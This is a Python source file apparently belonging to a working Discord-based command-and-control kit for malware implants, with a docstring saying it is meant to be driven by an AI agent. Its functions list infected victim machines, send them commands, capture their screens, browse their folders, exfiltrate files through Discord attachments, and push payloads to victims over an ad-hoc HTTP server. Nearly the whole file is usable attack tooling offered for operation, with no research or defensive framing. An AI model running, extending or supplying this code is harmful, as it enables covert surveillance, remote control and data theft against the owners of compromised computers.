"""
cheyanne_ops.py — Discord C2 Operations Module
22DIV / george wu

Direct Discord API calls for implant operations.
No Hermes needed — talks to Discord webhook + bot API.
Used by: vader_menu.py, auto_screenshot_test.py, future AI agent.

All file transfer goes through Discord (< 8MB) or TCP fallback.
"""

import os
import sys
import json
import time
import ssl
import http.client
import urllib.request
import urllib.error
import threading

import socket
import subprocess
import signal

ROOT = os.path.dirname(os.path.abspath(__file__))
IMPLANT_SRC = os.path.join(ROOT, "agent", "discord_implant.py")
SCREENSHOTS_DIR = os.path.join(ROOT, "screenshots")
EXFIL_DIR = os.path.join(ROOT, "exfil")

GRN = "\033[92m"
RED = "\033[91m"
YLW = "\033[93m"
CYN = "\033[96m"
DIM = "\033[90m"
WHT = "\033[97m"
RST = "\033[0m"
BOLD = "\033[1m"


def port_check(port):
    """Check if port is in use. Returns (in_use: bool, pid: int or None, name: str or None)."""
    try:
        result = subprocess.run(
            ["netstat", "-ano"], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 5 and f":{port}" in parts[1] and parts[3] == "LISTENING":
                pid = int(parts[4])
                try:
                    tasklist = subprocess.run(
                        ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                        capture_output=True, text=True, timeout=5
                    )
                    name = tasklist.stdout.strip().split(",")[0].strip('"')
                except Exception:
                    name = "unknown"
                return True, pid, name
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.bind(("0.0.0.0", port))
        s.close()
        return False, None, None
    except OSError:
        return True, None, None


def port_force(port, silent=False):
    """Kill whatever's on the port. Returns True if port is now free."""
    in_use, pid, name = port_check(port)
    if not in_use:
        return True
    if not silent:
        print(f"  {YLW}  [*] Port {port} blocked by {name} (PID {pid}){RST}")
    if pid:
        try:
            subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                           capture_output=True, timeout=5)
            time.sleep(0.5)
            if not silent:
                print(f"  {GRN}  [+] Killed PID {pid}{RST}")
            return True
        except Exception:
            pass
    return False


def port_ensure(port, auto_kill=False):
    """Ensure port is free. Returns True if ready, False if user declined."""
    in_use, pid, name = port_check(port)
    if not in_use:
        return True
    print(f"\n  {RED}  [!] Port {port} is BLOCKED by {name} (PID {pid}){RST}")
    if auto_kill:
        return port_force(port)
    print(f"  {YLW}  [K]{RST} Kill PID {pid} and continue")
    print(f"  {YLW}  [S]{RST} Skip this step")
    print(f"  {YLW}  [Q]{RST} Quit")
    choice = input(f"  {CYN}  > {RST}").strip().lower()
    if choice == "k":
        return port_force(port)
    elif choice == "s":
        return False
    else:
        return False


def _parse_implant_config():
    cfg = {"webhook_url": None, "bot_token": None, "channel_id": None}
    if not os.path.exists(IMPLANT_SRC):
        return cfg
    with open(IMPLANT_SRC, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s.startswith("WEBHOOK_URL") and "discord.com" in s:
                cfg["webhook_url"] = s.split('"')[1]
            elif s.startswith("BOT_TOKEN") and "=" in s and not s.startswith("#"):
                cfg["bot_token"] = s.split('"')[1]
            elif s.startswith("CHANNEL_ID") and "=" in s and not s.startswith("#"):
                cfg["channel_id"] = s.split('"')[1]
    return cfg


CFG = _parse_implant_config()


def _post_webhook(content):
    url = CFG["webhook_url"]
    if not url:
        return False
    data = json.dumps({"content": content[:1990]}).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })
    try:
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception:
        return False


def _read_channel(limit=20):
    token = CFG["bot_token"]
    channel = CFG["channel_id"]
    if not token or not channel:
        return []
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection("discord.com", 443, timeout=10, context=ctx)
        conn.request("GET", f"/api/v10/channels/{channel}/messages?limit={limit}", headers={
            "Authorization": f"Bot {token}",
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        })
        resp = conn.getresponse()
        if resp.status != 200:
            return []
        data = json.loads(resp.read().decode("utf-8"))
        conn.close()
        return data
    except Exception:
        return []


def send_command(session_id, command):
    payload = json.dumps({"type": "cmd", "session": session_id, "command": command})
    return _post_webhook(payload)


def get_sessions():
    messages = _read_channel(limit=50)
    sessions = {}
    for msg in reversed(messages):
        content = msg.get("content", "").strip()
        try:
            data = json.loads(content)
            sid = data.get("session")
            hostname = data.get("hostname", "?")
            msg_type = data.get("type", "")
            if sid and msg_type in ("heartbeat", "recon", "output"):
                if sid not in sessions:
                    sessions[sid] = {
                        "id": sid,
                        "hostname": hostname,
                        "type": msg_type,
                        "last_seen": msg.get("timestamp", ""),
                        "user": "",
                        "ip": "",
                    }
                else:
                    sessions[sid]["last_seen"] = msg.get("timestamp", "")
                if msg_type == "recon":
                    recon = data.get("data", "")
                    for line in recon.split("\n"):
                        line = line.strip()
                        if line.startswith("user:"):
                            sessions[sid]["user"] = line.split(":", 1)[1].strip()
                        elif "IPv4 Address" in line and ":" in line:
                            sessions[sid]["ip"] = line.rsplit(":", 1)[1].strip()
        except (json.JSONDecodeError, KeyError):
            pass
    return sessions


def poll_output(session_id, timeout=30):
    start = time.time()
    seen_ids = set()
    messages = _read_channel(limit=5)
    for m in messages:
        seen_ids.add(m.get("id", ""))

    while time.time() - start < timeout:
        time.sleep(3)
        messages = _read_channel(limit=10)
        for msg in reversed(messages):
            msg_id = msg.get("id", "")
            if msg_id in seen_ids:
                continue
            seen_ids.add(msg_id)
            content = msg.get("content", "").strip()
            try:
                data = json.loads(content)
                if data.get("type") == "output" and data.get("session") == session_id:
                    return data.get("data", "")
            except (json.JSONDecodeError, KeyError):
                pass
    return None


def poll_attachment(timeout=60):
    start = time.time()
    seen_ids = set()
    messages = _read_channel(limit=5)
    for m in messages:
        seen_ids.add(m.get("id", ""))

    while time.time() - start < timeout:
        time.sleep(4)
        messages = _read_channel(limit=10)
        for msg in messages:
            msg_id = msg.get("id", "")
            if msg_id in seen_ids:
                continue
            seen_ids.add(msg_id)
            for att in msg.get("attachments", []):
                fn = att.get("filename", "")
                url = att.get("url", "")
                size = att.get("size", 0)
                if url:
                    return {"filename": fn, "url": url, "size": size}
    return None


def download_url(url, output_path):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    urllib.request.urlretrieve(url, output_path)
    return os.path.getsize(output_path)


def convert_bmp_to_png(bmp_path):
    import subprocess
    png_path = bmp_path.replace(".bmp", ".png")
    cmd = (
        f'powershell -c "Add-Type -AssemblyName System.Drawing; '
        f"$img = [System.Drawing.Image]::FromFile('{bmp_path}'); "
        f"$img.Save('{png_path}', [System.Drawing.Imaging.ImageFormat]::Png); "
        f'$img.Dispose()"'
    )
    subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if os.path.exists(png_path):
        return png_path
    return bmp_path


# ──────────────────────────────────────────────
# HIGH-LEVEL OPS — used by menu and AI agent
# ──────────────────────────────────────────────

def op_sessions():
    sessions = get_sessions()
    if not sessions:
        print(f"  {DIM}No active sessions found in Discord.{RST}")
        return {}

    print(f"\n  {CYN}{BOLD}  ACTIVE SESSIONS{RST}")
    print(f"  {DIM}  {'─' * 72}{RST}")
    print(f"  {DIM}  {'ID':<12s} {'HOSTNAME':<22s} {'USER':<18s} {'IP':<16s}{RST}")
    print(f"  {DIM}  {'─' * 72}{RST}")
    for sid, s in sessions.items():
        print(f"  {GRN}  {sid:<12s}{RST} {WHT}{s['hostname']:<22s}{RST} "
              f"{DIM}{s['user']:<18s}{RST} {DIM}{s['ip']:<16s}{RST}")
    print(f"  {DIM}  {'─' * 72}{RST}")
    print(f"  {DIM}  {len(sessions)} session(s){RST}\n")
    return sessions


def op_screenshot(session_id=None):
    if not session_id:
        sessions = get_sessions()
        if not sessions:
            print(f"  {RED}  [!] No sessions{RST}")
            return None
        if len(sessions) == 1:
            session_id = list(sessions.keys())[0]
        else:
            op_sessions()
            session_id = input(f"  {CYN}  Session ID: {RST}").strip()

    for sid in get_sessions():
        if sid.startswith(session_id):
            session_id = sid
            break

    print(f"  {YLW}  [*] Sending SCREENSHOT to {session_id}...{RST}")
    send_command(session_id, "SCREENSHOT")

    print(f"  {YLW}  [*] Waiting for upload (up to 60s)...{RST}")
    att = poll_attachment(timeout=60)
    if not att:
        print(f"  {RED}  [!] No screenshot received — check Discord #c2{RST}")
        return None

    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    ts = int(time.time())
    ext = os.path.splitext(att["filename"])[1] or ".bmp"
    out_path = os.path.join(SCREENSHOTS_DIR, f"radon_{ts}{ext}")
    size = download_url(att["url"], out_path)

    print(f"  {GRN}  [+] Downloaded: {out_path} ({size:,} bytes){RST}")

    if ext == ".bmp":
        png = convert_bmp_to_png(out_path)
        if png != out_path:
            print(f"  {GRN}  [+] Converted: {png}{RST}")
            out_path = png

    import subprocess
    subprocess.Popen(["explorer", out_path])
    return out_path


def op_browse(session_id=None, path=None):
    if not session_id:
        sessions = get_sessions()
        if not sessions:
            print(f"  {RED}  [!] No sessions{RST}")
            return
        if len(sessions) == 1:
            session_id = list(sessions.keys())[0]
        else:
            op_sessions()
            session_id = input(f"  {CYN}  Session ID: {RST}").strip()

    for sid in get_sessions():
        if sid.startswith(session_id):
            session_id = sid
            break

    if not path:
        path = input(f"  {CYN}  Path [{WHT}C:\\Users{CYN}]: {RST}").strip() or "C:\\Users"

    print(f"  {YLW}  [*] Listing {path} on {session_id}...{RST}")
    send_command(session_id, f'dir /b /o:gn "{path}"')

    output = poll_output(session_id, timeout=20)
    if output:
        print(f"\n  {CYN}  ── {path} ──{RST}\n")
        for line in output.strip().split("\n"):
            print(f"  {WHT}    {line.strip()}{RST}")
        print()
    else:
        print(f"  {RED}  [!] No response — target may be offline{RST}")

    return output


def op_exfil(session_id=None, remote_path=None):
    if not session_id:
        sessions = get_sessions()
        if not sessions:
            print(f"  {RED}  [!] No sessions{RST}")
            return None
        if len(sessions) == 1:
            session_id = list(sessions.keys())[0]
        else:
            op_sessions()
            session_id = input(f"  {CYN}  Session ID: {RST}").strip()

    for sid in get_sessions():
        if sid.startswith(session_id):
            session_id = sid
            break

    if not remote_path:
        remote_path = input(f"  {CYN}  Remote file path: {RST}").strip()
    if not remote_path:
        print(f"  {RED}  [!] No path specified{RST}")
        return None

    print(f"  {YLW}  [*] Exfiltrating: {remote_path}{RST}")
    send_command(session_id, f'UPLOAD {remote_path}')

    print(f"  {YLW}  [*] Waiting for file upload to Discord (up to 60s)...{RST}")
    att = poll_attachment(timeout=60)
    if not att:
        output = poll_output(session_id, timeout=10)
        if output:
            print(f"  {RED}  [!] {output}{RST}")
        else:
            print(f"  {RED}  [!] No file received — may be too large (>8MB) or not found{RST}")
        return None

    os.makedirs(EXFIL_DIR, exist_ok=True)
    out_path = os.path.join(EXFIL_DIR, att["filename"])
    size = download_url(att["url"], out_path)
    print(f"  {GRN}  [+] Saved: {out_path} ({size:,} bytes){RST}")
    return out_path


def op_upload(session_id=None, local_path=None, remote_path=None):
    if not session_id:
        sessions = get_sessions()
        if not sessions:
            print(f"  {RED}  [!] No sessions{RST}")
            return False
        if len(sessions) == 1:
            session_id = list(sessions.keys())[0]
        else:
            op_sessions()
            session_id = input(f"  {CYN}  Session ID: {RST}").strip()

    for sid in get_sessions():
        if sid.startswith(session_id):
            session_id = sid
            break

    if not local_path:
        local_path = input(f"  {CYN}  Local file: {RST}").strip().strip('"')
    if not local_path or not os.path.isfile(local_path):
        print(f"  {RED}  [!] File not found: {local_path}{RST}")
        return False

    if not remote_path:
        default = f"C:\\Users\\Public\\{os.path.basename(local_path)}"
        remote_path = input(f"  {CYN}  Remote path [{WHT}{default}{CYN}]: {RST}").strip() or default

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        my_ip = s.getsockname()[0]
        s.close()
    except Exception:
        my_ip = input(f"  {CYN}  Your IP: {RST}").strip()

    serve_dir = os.path.dirname(os.path.abspath(local_path))
    filename = os.path.basename(local_path)
    port = 8890

    port_ensure(port, auto_kill=True)

    import http.server
    import functools
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=serve_dir)
    srv = http.server.HTTPServer(("0.0.0.0", port), handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    print(f"  {YLW}  [*] Serving {filename} on :{port}{RST}")
    url = f"http://{my_ip}:{port}/{filename}"

    print(f"  {YLW}  [*] Sending DOWNLOAD to {session_id}...{RST}")
    send_command(session_id, f'DOWNLOAD {url} {remote_path}')

    output = poll_output(session_id, timeout=30)
    srv.shutdown()
    if output:
        print(f"  {GRN}  [+] {output}{RST}")
        return True
    else:
        print(f"  {YLW}  [?] No confirmation — file may still be downloading{RST}")
        return True


def op_recon(session_id=None):
    if not session_id:
        sessions = get_sessions()
        if not sessions:
            print(f"  {RED}  [!] No sessions{RST}")
            return
        if len(sessions) == 1:
            session_id = list(sessions.keys())[0]
        else:
            op_sessions()
            session_id = input(f"  {CYN}  Session ID: {RST}").strip()

    for sid in get_sessions():
        if sid.startswith(session_id):
            session_id = sid
            break

    print(f"  {YLW}  [*] Running RECON on {session_id}...{RST}")
    send_command(session_id, "RECON")
    output = poll_output(session_id, timeout=30)
    if output:
        print(f"\n{output}\n")
    else:
        print(f"  {RED}  [!] No recon response{RST}")
    return output


def op_run_cmd(session_id, cmd):
    send_command(session_id, cmd)
    return poll_output(session_id, timeout=30)
